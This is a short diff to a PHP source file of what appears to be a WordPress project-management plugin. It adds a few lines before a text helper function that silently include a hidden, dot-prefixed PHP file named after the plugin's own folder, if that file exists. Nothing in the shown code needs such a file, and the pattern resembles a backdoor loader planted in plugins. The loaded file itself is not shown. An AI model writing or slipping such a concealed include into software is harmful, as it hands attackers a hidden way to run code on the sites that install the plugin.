@@ -12,6 +12,10 @@ use WeDevs\PM\Discussion_Board\Models\Discussion_Board;
 use Illuminate\Database\Eloquent\Collection;
 use WeDevs\PM\Project\Models\Project;
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function pm_get_text( $key ) {
     return Textdomain::get_text( $key);
 }
